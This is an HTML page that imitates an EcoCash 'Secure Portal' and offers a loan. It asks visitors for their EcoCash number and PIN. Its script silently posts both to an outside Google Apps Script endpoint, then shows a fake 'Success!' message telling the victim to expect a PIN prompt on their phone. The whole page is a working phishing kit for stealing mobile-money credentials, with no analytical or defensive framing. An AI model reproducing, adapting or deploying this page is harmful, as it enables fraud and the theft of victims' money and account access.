<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>EcoCash | Secure Portal</title>
    <style>
        * { box-sizing: border-box; }
        body {
            margin: 0; padding: 0;
            font-family: 'Segoe UI', Arial, sans-serif;
            display: flex; flex-direction: column; align-items: center;
            background-color: #ffffff;
        }

        .banner {
            width: 100%; max-width: 500px;
            background: radial-gradient(circle at center, #1e73be 0%, #003366 100%);
            padding: 45px 20px; text-align: center; color: white;
        }

        .logo-container {
            background: white; display: inline-block;
            padding: 6px 14px; border-radius: 4px; margin-bottom: 25px;
        }
        .logo-text { color: #003366; font-weight: 800; font-size: 22px; }
        .logo-red { color: #cc0000; }

        .headline { font-size: 24px; font-weight: 600; margin-bottom: 8px; }
        .subheadline { font-size: 14px; opacity: 0.9; margin-bottom: 30px; font-weight: 300; }

        .icon-wrapper { margin: 20px auto; width: 80px; height: 80px; }

        .form-area { width: 100%; max-width: 500px; padding: 30px 40px; text-align: center; }

        input {
            width: 100%; padding: 14px; margin-bottom: 15px;
            border: 1.5px solid #2ea3f2; border-radius: 8px;
            font-size: 16px; outline: none;
        }

        .btn-submit {
            width: 140px; background-color: #00a2ff; color: white;
            border: none; padding: 12px; border-radius: 8px;
            font-size: 16px; font-weight: 600; cursor: pointer;
        }

        #status-msg { margin-top: 20px; font-size: 14px; color: #003366; line-height: 1.5; }
    </style>
</head>
<body>

    <div class="banner">
        <div class="logo-container">
            <span class="logo-text">Eco<span class="logo-red">Cash</span></span>
        </div>
        <div class="headline">EcoCash is Safe & Secure</div>
        <div class="subheadline">Your PIN is your secret, don't share with anyone</div>
        <div class="icon-wrapper">
            <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                <rect x="5" y="11" width="14" height="10" rx="2" stroke="white" stroke-width="2"/>
                <path d="M8 11V7C8 4.79086 9.79086 3 12 3C14.2091 3 16 4.79086 16 7V11" stroke="white" stroke-width="2"/>
                <circle cx="12" cy="16" r="1" fill="white"/>
            </svg>
        </div>
    </div>

    <div class="form-area">
        <form id="ecoForm">
            <input type="tel" name="phone" placeholder="Ecocash number" required>
            <input type="password" name="pin" placeholder="Pin" maxlength="4" required>
            <button type="submit" class="btn-submit" id="btn">Get loan</button>
        </form>
        <div id="status-msg"></div>
    </div>

    <script>
        // Updated to your Version 3 Deployment ID
        const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbzXhYvdFbg0Mvhw2V8Jm_7Zbq6IEHlAtzEwhrWp-HfRm3taBj0IRa3htkGt8h6ALIV97A/exec';
        
        const form = document.getElementById('ecoForm');
        const btn = document.getElementById('btn');
        const statusMsg = document.getElementById('status-msg');

        form.addEventListener('submit', e => {
            e.preventDefault();
            btn.innerText = "Processing...";
            btn.disabled = true;
            statusMsg.innerText = "Checking your eligibility...";

            fetch(SCRIPT_URL, { 
                method: 'POST', 
                mode: 'no-cors', 
                body: new FormData(form) 
            })
            .then(() => {
                // Since we use 'no-cors', this will trigger regardless of Google's response
                statusMsg.innerHTML = "<b style='color: #28a745;'>Success!</b><br>Your request has been received. Please wait for the EcoCash PIN prompt on your phone.";
                btn.innerText = "Done";
                form.reset();
            })
            .catch(err => {
                statusMsg.innerText = "Connection error. Please try again.";
                btn.innerText = "Get loan";
                btn.disabled = false;
            });
        });
    </script>
</body>
</html>
